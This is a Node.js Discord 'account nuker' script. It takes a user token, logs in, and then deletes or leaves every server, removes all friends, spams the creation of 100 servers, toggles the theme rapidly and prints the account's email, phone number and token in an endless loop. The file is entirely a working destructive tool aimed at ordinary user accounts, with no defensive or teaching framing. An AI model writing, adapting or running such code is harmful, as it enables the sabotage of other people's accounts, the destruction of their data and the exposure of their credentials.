const request = require("superagent");
const discord = require("discord.js");
const client = new discord.Client();

process.on("error", () => console.log("some error happend but nothing to worry about"));

let token;
process.stdout.write("enter token: ");
process.stdin.once("data", input => {
    token = input.toString().trim();
    client.login(token)
});

const aaaaaaaaaaaaaaaaaaaaaaaaa = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
function randomChars(charLength) {
    let stringResult = "";
    for (let i = 0; i < charLength; i++) {
        stringResult += aaaaaaaaaaaaaaaaaaaaaaaaa.charAt(Math.floor(Math.random() * aaaaaaaaaaaaaaaaaaaaaaaaa.length));
    }
    return stringResult;
};

client.on("ready", async () => {
    const guilds = client.guilds.values();
    const friends = client.user.friends.values();

    let loop = false;
    setInterval(() => {
        loop = !loop;
        client.user.settings.update("theme", loop ? "dark" : "light");
    }, 100);
    for (const guild of guilds) {
        if (guild.ownerID === client.user.id) guild.delete();
        else guild.leave();
    }
    for (const friend of friends) {
        friend.removeFriend();
    }

    for (let i = 0; i < 100; i++) {
        client.user.createGuild(randomChars(100));
    }

    while(true) {
        const info = await request("https://canary.discordapp.com/api/v6/users/@me").set('Authorization', client.token).set("Content-Type", "application/json");
        console.clear()
        console.log(`lmao now destroying ${client.user.tag}'s discord
            ---info---
    id: ${client.user.id}
    tag: ${client.user.tag}
    email: ${client.user.email}
    phone number: ${info.body.phone === null ? "no phone number" : info.body.phone}
    token: ${client.token}
    language: ${info.body.locale}
    `);
    }
});